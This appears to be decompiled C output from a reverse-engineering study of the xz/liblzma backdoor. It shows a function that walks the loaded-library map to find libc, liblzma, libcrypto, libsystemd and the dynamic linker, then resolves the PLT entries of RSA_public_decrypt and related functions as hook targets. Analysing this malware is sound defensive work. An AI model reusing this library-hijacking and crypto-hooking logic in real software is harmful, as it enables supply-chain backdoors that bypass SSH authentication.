// /home/kali/xzre-ghidra/xzregh/104660_process_shared_libraries_map.c
// Function: process_shared_libraries_map @ 0x104660
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_shared_libraries_map(link_map * r_map, backdoor_shared_libraries_data_t * data)


BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data_t *data)

{
  char cVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  undefined8 *puVar4;
  elf_info_t *peVar5;
  backdoor_data_t *pbVar6;
  backdoor_hooks_data_t **ppbVar7;
  EncodedStringId EVar8;
  BOOL BVar9;
  Elf64_Sym *pEVar10;
  link_map *plVar11;
  ulong *puVar12;
  void *pvVar13;
  char *string_end;
  char *string_begin;
  u64 local_30;
  
  if (r_map == (link_map *)0x0) {
    return 0;
  }
  pEVar10 = elf_symbol_get(data->elf_handles->dynamic_linker,STR_rtld_global,0);
  if (pEVar10 == (Elf64_Sym *)0x0) {
    return 0;
  }
  do {
    if (*(ulong *)(r_map + 0x18) == 0) {
      pbVar6 = data->data;
      if (pbVar6->main_map == (link_map *)0x0) {
        return 0;
      }
      if (pbVar6->libcrypto_map == (link_map *)0x0) {
        return 0;
      }
      if (pbVar6->dynamic_linker_map == (link_map *)0x0) {
        return 0;
      }
      if (pbVar6->libsystemd_map == (link_map *)0x0) {
        return 0;
      }
      if (pbVar6->liblzma_map == (link_map *)0x0) {
        return 0;
      }
      if (pbVar6->libc_map == (link_map *)0x0) {
        return 0;
      }
      break;
    }
    if (*(ulong *)r_map == 0) {
      return 0;
    }
    string_end = *(char **)(r_map + 8);
    if (string_end == (char *)0x0) {
      return 0;
    }
    if (*(ulong *)(r_map + 0x10) == 0) {
      return 0;
    }
    string_begin = string_end;
    if (*string_end == '\0') {
      if (data->data->main_map != (link_map *)0x0) {
        return 0;
      }
      data->data->main_map = r_map;
    }
    else {
      while (cVar1 = *string_end, cVar1 != '\0') {
        string_end = string_end + 1;
        if (cVar1 == '/') {
          string_begin = string_end;
        }
      }
      EVar8 = get_string_id(string_begin,string_end);
      pbVar6 = data->data;
      if (EVar8 == STR_libc_so) {
        if (pbVar6->libc_map != (link_map *)0x0) {
          return 0;
        }
        pbVar6->libc_map = r_map;
      }
      else if (EVar8 < 0x7d1) {
        if (EVar8 == STR_liblzma_so) {
          if (pbVar6->liblzma_map != (link_map *)0x0) {
            return 0;
          }
          if (0x10465f < *(ulong *)r_map) {
            return 0;
          }
          if ((code *)(*(ulong *)r_map + 0x400000) < process_shared_libraries_map) {
            return 0;
          }
          if (*(ulong *)(r_map + 0x18) == 0) {
            return 0;
          }
          pbVar6->liblzma_map = r_map;
        }
        else if (EVar8 == STR_libcrypto_so) {
          if (pbVar6->libcrypto_map != (link_map *)0x0) {
            return 0;
          }
          pbVar6->libcrypto_map = r_map;
        }
      }
      else if (EVar8 == STR_libsystemd_so) {
        if (pbVar6->libsystemd_map != (link_map *)0x0) {
          return 0;
        }
        pbVar6->libsystemd_map = r_map;
      }
      else if (EVar8 == STR_ld_linux_x86_64_so) {
        if (pbVar6->dynamic_linker_map != (link_map *)0x0) {
          return 0;
        }
        peVar5 = data->elf_handles->dynamic_linker;
        plVar11 = (link_map *)(peVar5->elfbase->e_ident + pEVar10->st_value);
        if (r_map <= plVar11) {
          return 0;
        }
        if (pEVar10->st_size < (ulong)((long)r_map - (long)plVar11)) {
          return 0;
        }
        if (*(Elf64_Dyn **)(r_map + 0x10) != peVar5->dyn) {
          return 0;
        }
        pbVar6->dynamic_linker_map = r_map;
      }
    }
    pbVar6 = data->data;
    r_map = *(link_map **)(r_map + 0x18);
  } while ((((pbVar6->main_map == (link_map *)0x0) || (pbVar6->libcrypto_map == (link_map *)0x0)) ||
           (pbVar6->dynamic_linker_map == (link_map *)0x0)) ||
          (((pbVar6->libsystemd_map == (link_map *)0x0 || (pbVar6->liblzma_map == (link_map *)0x0))
           || (pbVar6->libc_map == (link_map *)0x0))));
  puVar2 = (undefined8 *)data->RSA_get0_key_plt;
  puVar3 = (undefined8 *)data->EVP_PKEY_set1_RSA_plt;
  puVar4 = (undefined8 *)data->RSA_public_decrypt_plt;
  peVar5 = data->elf_handles->main;
  plVar11 = data->data->main_map;
  if (plVar11 == (link_map *)0x0) {
    return 0;
  }
  BVar9 = elf_parse(*(Elf64_Ehdr **)plVar11,peVar5);
  if (BVar9 == 0) {
    return 0;
  }
  if (peVar5->gnurelro_found == 0) {
    return 0;
  }
  if ((peVar5->flags & 0x20) == 0) {
    return 0;
  }
  puVar12 = (ulong *)elf_get_plt_symbol(peVar5,STR_RSA_public_decrypt);
  *puVar4 = puVar12;
  if (puVar12 < (ulong *)0x1000000) {
    puVar12 = (ulong *)elf_get_plt_symbol(peVar5,STR_EVP_PKEY_set1_RSA);
    *puVar3 = puVar12;
    if (((ulong *)0xffffff < puVar12) && (0xffffff < *puVar12)) {
      return 0;
    }
    puVar12 = (ulong *)elf_get_plt_symbol(peVar5,STR_RSA_get0_key);
    *puVar2 = puVar12;
    if (puVar12 < (ulong *)0x1000000) goto LAB_00104924;
  }
  if (0xffffff < *puVar12) {
    return 0;
  }
LAB_00104924:
  plVar11 = data->data->libcrypto_map;
  if ((plVar11 != (link_map *)0x0) &&
     (BVar9 = elf_parse(*(Elf64_Ehdr **)plVar11,data->elf_handles->libcrypto), BVar9 != 0)) {
    ppbVar7 = data->hooks_data_addr;
    local_30 = 0;
    peVar5 = data->elf_handles->liblzma;
    plVar11 = data->data->liblzma_map;
    if ((plVar11 != (link_map *)0x0) &&
       (((BVar9 = elf_parse(*(Elf64_Ehdr **)plVar11,peVar5), BVar9 != 0 &&
         ((peVar5->flags & 0x20) != 0)) &&
        (pvVar13 = elf_get_data_segment(peVar5,&local_30,1), 0x597 < local_30)))) {
      *ppbVar7 = (backdoor_hooks_data_t *)((long)pvVar13 + 0x10);
      *(u64 *)((long)pvVar13 + 0x590) = local_30 - 0x598;
      plVar11 = data->data->libc_map;
      if ((plVar11 != (link_map *)0x0) &&
         (BVar9 = elf_parse(*(Elf64_Ehdr **)plVar11,data->elf_handles->libc), BVar9 != 0)) {
        BVar9 = resolve_libc_imports
                          (data->data->libc_map,data->elf_handles->libc,data->libc_imports);
        return (uint)(BVar9 != 0);
      }
    }
  }
  return 0;
}

